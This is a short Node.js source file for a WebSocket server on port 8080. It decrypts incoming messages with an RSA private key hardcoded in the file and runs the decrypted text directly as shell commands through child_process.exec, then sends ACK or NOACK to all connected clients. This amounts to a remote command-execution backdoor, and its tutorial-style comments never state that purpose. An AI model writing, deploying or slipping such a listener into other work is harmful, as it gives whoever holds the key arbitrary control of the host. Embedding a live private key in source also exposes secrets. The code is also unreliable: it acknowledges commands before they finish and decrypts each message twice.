const WebSocket = require('ws');
var forge = require('node-forge');
const { exec } = require('child_process');
// starts server instance on http://localhost:8080
const wss = new WebSocket.Server({ port: 8080 });
var plain,cod=0;
// waits for connection to be established from the client
// the callback argument ws is a unique for each client
wss.on('connection', (ws) => {

  // runs a callback on message event
  ws.on('message', (encryptText) => {
    let pk = forge.pki.privateKeyFromPem("-----BEGIN PRIVATE KEY-----MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDFdKmQKaYcb5Li8EiSyUg0knJW96Rz6SYc7yo0jd9JyZgtVauzVnFcXSpHWJ39kI/K93zwxlbGiZHIc00RvPh1xs5nSbpDnYV5T9efLSWMDHRXF9V0hfZXEvhbBw1sA3Gsdr7Er4PYzJXxB3FPKS4LVLBdqfwW8SanO+08o/ji/J/c0DbMcJ8RDv/3e0R6Uqa37Iry+FYiIpsqG58okO4LezDQpYF4U0GR/B4rFlH40qPx7ZkH9YAFqFS4QPWTcMA62SM3Ax7rFVBVoOM9P1jvzDwabe1m0Q1L5YYIedOXe2BJZm+AvM5tnPLX9VdbJMdwZ05NTKu0jTsdtFhwCfcJAgMBAAECggEBAKeJqEH5BMfF57UEuh9KCCkLRVcDQpdS8RLF32K+KgJaufNlaI1/QCplpnTo/Qzj9w35VhqZv5EvsvGI25C8bXjJWeKLzS6H3nOjSkn2LZCaFLC9OVFoRS92miHqZvoKJg52psEOR2nRlTvw27SWNUpJ7mdaztnMfcaR82ZrnsdAovRepr5hURRqEQiRvzo+1kr51hd0WlSiDeH7CXvyavJ92qsZ92ICL/AN9GQoD88Hw5rF8CSr8IYxDGD7tBTwL6lvMbT6YKDX2LXjv2lezBDRLWuJ01qzXOkNE9HuqZm5C79yP8WHHLoVpTztYPjMx/RMvTTD5u1ux2l7ddQrA00CgYEA5CkOTbg1AcamQ74Kft/QxoFoA2qobQzs/oFpao1LaetXvnKDvg8EThYEqKwQGITUj9/dWh96LYTMqZXJB3nMTNzpmeDl5Bli6Cs2h/ey0hf9ZKO3IiN4bmUCSehQolTv8r/EmrsfJbngrNPtWAFnanFBbJCSmB2zama/5G+4YpcCgYEA3Yx/pM0FoP5JIOe5pmUUplJjW/PAirmHYZMPFXB2O7ye0lGpe96RS7pBdRcuKqbTBqOUmoKu+ttXhlnDeiNmrMlXbtYjnMM60oEHLnL7dNSSB6Eb1SwokGhNp8sN00qSEaPh9vzpcJ+BQbfDTQwHnjoFoCxOoHBlrXLnLdsWx18CgYAH1/V67IM9/WNH3uejdvRJbrdxrp/9p70Z/r7t/8+A46tPi8ZFqWR/frhISCoBfceE7rBAYeakW/VhOxn/HMvONKX/OUEN92V0D9A/Gl/WYya95/bqwIdqXCSY/9iNzBe3o6oRm681b89ugZaeOOYiPaR/I/U2L4c0eDXOl5yiHwKBgAY1wvoumQLLPeeDN0v3t112H7zbF0GMM8RDZ//U2CuSfO0uRs7nDTGPNfh/PtcJOA8OlMLD+P2lGk30xCrvRRiAyEeeDv985XAzF61woaXDs5gtJueRxk1N7ydN5MRQacm+yz2uFykF/4yFBx9ov+nqfG/h7g5HOEJlXx+E7Z2HAoGBAJ7NnodlEb9/+X8F+IRF/H2uLUk1bmiZVO1OafRwhrj/UF/NqIrK+GoaM7D/JwI6NybXlIXCjlaBzP03X0gFTCvTR2Bf6ja9D7WQfEsAQTES4xtWoyt/qNk5TLRwa2iRUwD8tFmAGsChi9VcJ5+6ulo5t31k0q7/Ea9f7IsOFxmc-----END PRIVATE KEY-----");
    plain = forge.util.decodeUtf8(pk.decrypt(encryptText));
    plain = plain.slice(3, plain.length-4);
    console.log(plain);
    dir = exec(plain, function(err, stdout, stderr) {
    if (err) {
    // should have err.code here?
    }
    console.log(stdout);
    });

    dir.on('exit', function (code) {
    	cod = code; 
    });
    // sends the data to all connected clients
    plain = forge.util.decodeUtf8(pk.decrypt(encryptText));
    // sends the data to all connected clients
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          if(cod==0) {
          client.send("ACK"); }
        else {
          client.send("NOACK"); }
        }
    });
  });
});
